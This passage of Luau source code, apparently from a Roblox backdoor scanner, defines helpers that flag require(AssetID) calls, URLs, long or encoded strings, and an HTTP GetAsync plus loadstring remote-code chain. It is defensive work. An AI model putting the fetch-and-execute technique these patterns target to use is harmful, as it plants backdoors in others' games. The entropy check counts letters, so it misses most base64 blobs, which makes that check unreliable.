-- §16  DETECTION HELPERS
-- ════════════════════════════════════════════════════════════════════════

local function badName(name)
    local low = name:lower()
    for _, kw in ipairs(CFG.BAD_NAMES) do
        if low:find(kw, 1, true) then return true, kw end
    end
    return false, nil
end

local function recurse(root, out)
    out = out or {}
    local ok, ch = pcall(function() return root:GetChildren() end)
    if not ok then return out end
    for _, c in ipairs(ch) do out[#out+1]=c; recurse(c,out) end
    return out
end

local function isHighEntropy(str)
    if #str < 80 then return false end
    local alpha=0; for _ in str:gmatch("%a") do alpha+=1 end
    return (alpha/#str) < 0.18
end

local function deepScanSource(inst)
    local flags, sigs = {}, {}
    local ok, src = pcall(function() return inst.Source end)
    if not ok or type(src)~="string" or #src==0 then return flags, sigs end

    -- Pattern matching
    for _, p in ipairs(CFG.SRC_PATTERNS) do
        if src:find(p.p) then flags[#flags+1]=p end
    end

    -- Signature matching (multi-condition)
    for _, sig in ipairs(CFG.SIGNATURES) do
        local match = true
        for _, cond in ipairs(sig.conds) do
            if not src:find(cond) then match=false; break end
        end
        if match then sigs[#sigs+1]=sig end
    end

    -- Obfuscation: long lines
    if CFG.SCAN_OBFUSCATION then
        for line in src:gmatch("[^\n]+") do
            if #line > CFG.ENTROPY_LINE_LEN then
                flags[#flags+1]={p="",l="long line (obfuscation, "..#line.." chars)",sev="WARN",w=15}; break
            end
        end
    end

    -- Obfuscation: high-entropy string literals
    if CFG.SCAN_OBFUSCATION then
        for tok in src:gmatch('["\']([A-Za-z0-9+/=]{80,})["\']') do
            if isHighEntropy(tok) then
                flags[#flags+1]={p="",l="high-entropy blob (encoded payload)",sev="CRIT",w=30}; break
            end
        end
    end

    -- require(AssetID) — extract the actual IDs
    for id in src:gmatch("require%s*%(%s*(%d+)%s*%)") do
        flags[#flags+1]={p="",l="require("..id..")",sev="CRIT",w=40}
    end

    -- HTTP + loadstring chain
    if src:find("GetAsync") and src:find("loadstring") then
        flags[#flags+1]={p="",l="HTTP+loadstring C2 chain",sev="CRIT",w=50}
    end

    return flags, sigs
end

local function scanAttributes(inst)
    local findings = {}
    local ok, attrs = pcall(function() return inst:GetAttributes() end)
    if not ok then return findings end
    for k, v in pairs(attrs) do
        local vs = tostring(v)
        if vs:match("^%d%d%d%d%d%d%d") then findings[#findings+1]="Attr '"..k.."'="..vs.." (possible AssetID)" end
        if vs:match("https?://")        then findings[#findings+1]="Attr '"..k.."' = URL: "..vs:sub(1,60) end
        if #vs>60 and isHighEntropy(vs) then findings[#findings+1]="Attr '"..k.."' = high-entropy (encoded?)" end
    end
    return findings
end

local function scanStrVal(inst)
    local findings = {}
    if not (inst:IsA("StringValue")) then return findings end
    local ok, v = pcall(function() return tostring(inst.Value) end)
    if not ok then return findings end
    if v:match("^%d%d%d%d%d%d%d")  then findings[#findings+1]="StringValue possible AssetID: "..v end
    if v:match("https?://")         then findings[#findings+1]="StringValue URL: "..v:sub(1,80) end
    if #v>60 and isHighEntropy(v)   then findings[#findings+1]="StringValue high-entropy data" end
    return findings
end

